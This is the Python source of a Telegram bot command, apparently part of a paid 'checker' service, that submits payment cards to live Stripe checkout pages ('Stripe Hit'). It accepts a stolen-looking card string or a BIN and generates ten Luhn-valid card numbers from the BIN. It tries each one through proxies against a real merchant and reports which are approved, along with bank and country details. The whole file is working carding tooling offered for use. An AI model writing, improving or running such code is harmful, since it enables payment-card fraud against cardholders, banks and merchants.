# Crafted With <3 By Bhaskar
import time
import asyncio
import re
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from FUNC.cc_gen import luhn_card_genarator
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import get_hit_resp
from .gate import hit_gate

_CC_RE = re.compile(r'(\d{15,18})[\/\s:|-]*?(\d{1,2})[\/\s:|-]*?(\d{2,4})[\/\s:|-]*?(\d{3,4})')
_BIN_RE = re.compile(r'^(\d{6,16})$')

_STATUS_ICON = {
    "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅": "✅",
    "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ❎": "❎",
    "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌": "❌",
}


def _parse_cc(text):
    m = _CC_RE.search(text)
    return m.groups() if m else None


def _parse_bin(text):
    m = _BIN_RE.search(text.strip())
    return m.group(1) if m else None


@Client.on_message(filters.command("hit", [".", "/"]))
async def hit_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)

        gateway = "Stripe Hit [MO]"
        cmd = "/hit"

        if checkall[0] == False:
            return

        role = checkall[1]
        parts = message.text.split()

        # ── Parse checkout URL ──
        if len(parts) < 2:
            await message.reply_text(f"""<b>
Gate Name: {gateway} ♻️
CMD: {cmd}

Message: Provide a Stripe checkout URL ❌

Usage: {cmd} &lt;checkout_url&gt; cc|mm|yy|cvv
Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt;</b>""", message.id)
            return

        checkout_url = parts[1]

        if "checkout.stripe.com" not in checkout_url and "cs_live" not in checkout_url and "cs_test" not in checkout_url:
            await message.reply_text(
                f"<b>Gate Name: {gateway} ♻️\nCMD: {cmd}\n\nMessage: Invalid Stripe checkout URL ❌</b>",
                message.id,
            )
            return

        # ── Parse input: full CC or BIN ──
        raw_input = None
        if len(parts) >= 3:
            raw_input = parts[2]
        if not raw_input:
            try:
                raw_input = message.reply_to_message.text.strip()
            except Exception:
                pass

        if not raw_input:
            await message.reply_text(f"""<b>
Gate Name: {gateway} ♻️
CMD: {cmd}

Message: No CC or BIN Found ❌

Usage: {cmd} &lt;checkout_url&gt; cc|mm|yy|cvv
Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt;</b>""", message.id)
            return

        cc_tuple = _parse_cc(raw_input)
        bin_str = _parse_bin(raw_input) if not cc_tuple else None

        if not cc_tuple and not bin_str:
            await message.reply_text(f"""<b>
Gate Name: {gateway} ♻️
CMD: {cmd}

Message: Invalid CC or BIN format ❌

Usage: {cmd} &lt;checkout_url&gt; cc|mm|yy|cvv
Or: {cmd} &lt;checkout_url&gt; &lt;BIN&gt; (6-16 digits)</b>""", message.id)
            return

        # ══════════════════════════════════════
        #  SINGLE CC MODE
        # ══════════════════════════════════════
        if cc_tuple:
            cc, mes, ano, cvv = cc_tuple
            fullcc = f"{cc}|{mes}|{ano}|{cvv}"

            progress = await message.reply_text(f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
</b>""", message.id)

            await asyncio.sleep(0.5)
            progress = await Client.edit_message_text(message.chat.id, progress.id, f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
""")

            start = time.perf_counter()
            proxies = await get_proxy_format()
            result = await hit_gate(cc, mes, ano, cvv, checkout_url, proxy=proxies)

            getbin = await get_bin_details(cc)
            getresp = await get_hit_resp(result, user_id, fullcc)
            status = getresp["status"]
            response = getresp["response"]
            merchant = getresp["merchant"]
            price = getresp["price"]

            brand, typee, level, bank, country, flag, currency = getbin

            await Client.edit_message_text(message.chat.id, progress.id, f"""
{status}

𝗖𝗮𝗿𝗱- <code>{fullcc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲- <i>{gateway}</i>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞- ⤿ <i>{response}</i> ⤾

𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
𝐏𝐫𝐢𝐜𝐞- {price}

𝗜𝗻𝗳𝗼- {brand} - {typee} - {level}
𝐁𝐚𝐧𝐤- {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲- {country} - {flag} - {currency}

𝗧𝗶𝗺𝗲- {time.perf_counter() - start:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
</b>""")
            await setantispamtime(user_id)
            await deductcredit(user_id)
            return

        # ══════════════════════════════════════
        #  BIN MODE — generate 10 Luhn cards
        # ══════════════════════════════════════
        getbin = await get_bin_details(bin_str)
        brand, typee, level, bank, country, flag, currency = getbin

        progress = await message.reply_text(f"""
↯ <b>BIN Mode — Generating 10 cards</b>

- 𝐁𝐈𝐍 - <code>{bin_str}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝗜𝗻𝗳𝗼 - {brand} - {typee} - {level}
- 𝐁𝐚𝐧𝐤 - {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 - {country} {flag}

⏳ Generating cards...
""", message.id)

        cards_raw = await luhn_card_genarator(bin_str, "None", "None", "None", 10)
        cards = [c.strip() for c in cards_raw.strip().split("\n") if c.strip()]

        if not cards:
            await Client.edit_message_text(message.chat.id, progress.id,
                f"<b>Gate Name: {gateway} ♻️\n\nFailed to generate cards from BIN {bin_str} ❌</b>")
            return

        start = time.perf_counter()
        results_lines = []
        checked = 0

        for card_str in cards:
            cc, mes, ano, cvv = card_str.split("|")
            fullcc = card_str
            checked += 1

            bar = "■" * checked + "□" * (len(cards) - checked)
            await Client.edit_message_text(message.chat.id, progress.id, f"""
↯ <b>BIN Mode — Checking {checked}/{len(cards)}</b>

- 𝐁𝐈𝐍 - <code>{bin_str}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 - {bar}

⏳ Hitting <code>{fullcc}</code>
""")

            proxies = await get_proxy_format()
            result = await hit_gate(cc, mes, ano, cvv, checkout_url, proxy=proxies)
            getresp = await get_hit_resp(result, user_id, fullcc)
            status = getresp["status"]
            response = getresp["response"]

            icon = _STATUS_ICON.get(status, "❌")
            results_lines.append(f"{icon} <code>{fullcc}</code> → {response}")

        elapsed = time.perf_counter() - start
        merchant = getresp.get("merchant", "N/A")
        price = getresp.get("price", "N/A")

        results_block = "\n".join(results_lines)

        await Client.edit_message_text(message.chat.id, progress.id, f"""
<b>𝐇𝐢𝐭 𝐑𝐞𝐬𝐮𝐥𝐭𝐬 — BIN: <code>{bin_str}</code></b>

{results_block}

𝐆𝐚𝐭𝐞𝐰𝐚𝐲- <i>{gateway}</i>
𝐌𝐞𝐫𝐜𝐡𝐚𝐧𝐭- {merchant}
𝐏𝐫𝐢𝐜𝐞- {price}

𝗜𝗻𝗳𝗼- {brand} - {typee} - {level}
𝐁𝐚𝐧𝐤- {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲- {country} - {flag} - {currency}

𝗧𝗶𝗺𝗲- {elapsed:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
""")
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        await log_cmd_error(message)
